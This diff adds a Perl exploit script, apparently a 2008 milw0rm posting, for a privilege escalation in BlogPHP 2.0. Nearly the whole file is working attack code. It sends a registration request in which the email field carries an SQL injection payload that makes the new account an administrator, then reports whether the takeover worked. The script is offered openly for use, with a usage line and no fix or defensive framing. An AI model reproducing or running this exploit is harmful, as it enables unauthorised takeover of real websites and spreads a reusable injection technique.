@@ -1,0 +1,64 @@
+#!/usr/bin/perl
+# BlogPHP 2.0 Remote Privilege Escalation Exploit
+# Author : Cod3rZ
+# Site   : http://cod3rz.helloweb.eu
+# Site   : http://devilsnight.altervista.org
+# Cuz We Back Rude This Time
+#
+# Privilege Escalation
+# Send a request to http://127.0.0.1/BlogPHPv2/index.php?act=register2 with:
+# username=[yourusername]&password=[yourpass]&email=[yourmail]','Admin','','','','','','','','','','','','')/*
+#
+# There are other bugs, find them yourself
+#
+# Usage: perl bp.pl <site> <user> <pass> <mail>
+
+system('cls');
+#system('clear');
+
+use LWP::UserAgent;
+use HTTP::Request::Common;
+
+$site = $ARGV[0];
+$user = $ARGV[1];
+$pass = $ARGV[2];
+$mail = $ARGV[3];
+
+ print " -------------------------------------------------\n";
+ print " BlogPHP 2.0 Remote Privilege Escalation Exploit  \n";
+ print " Powered by Cod3rZ                                \n";
+ print " http://cod3rz.helloweb.eu                        \n";
+ print " -------------------------------------------------\n";
+
+sub usage {
+	print " Usage: perl bp.pl <site> <user> <pass> <mail>    \n";
+	print " -------------------------------------------------\n";
+}
+ if(!$mail) { &usage; }
+ else {	
+	if ($site !~ /http:\/\//) { $site = "http://".$site; }
+
+	print " Site: $site                                      \n";
+	print " User: $user                                      \n";
+	print " Pass: $pass                                      \n";
+	print " Mail: $mail                                      \n";
+	print " -------------------------------------------------\n";
+	print " Please Wait                                      \n";
+	print " -------------------------------------------------\n";
+
+	$ua = LWP::UserAgent->new;
+	 $lwp = $ua->request(POST $site.'index.php?act=register2', 
+	  [ username => $user, password => $pass, email    => $mail."','Admin','','','','','','','','','','','','')/*" ]);
+	
+	if($lwp->content =~ /Your now registered and logged in/) {
+		print " Done. Now you're admin                           \n";
+		print " -------------------------------------------------\n";
+	}
+	else {
+		print " Failed.                                          \n";
+		print " -------------------------------------------------\n";
+	}
+
+}
+
+# milw0rm.com [2008-06-23]
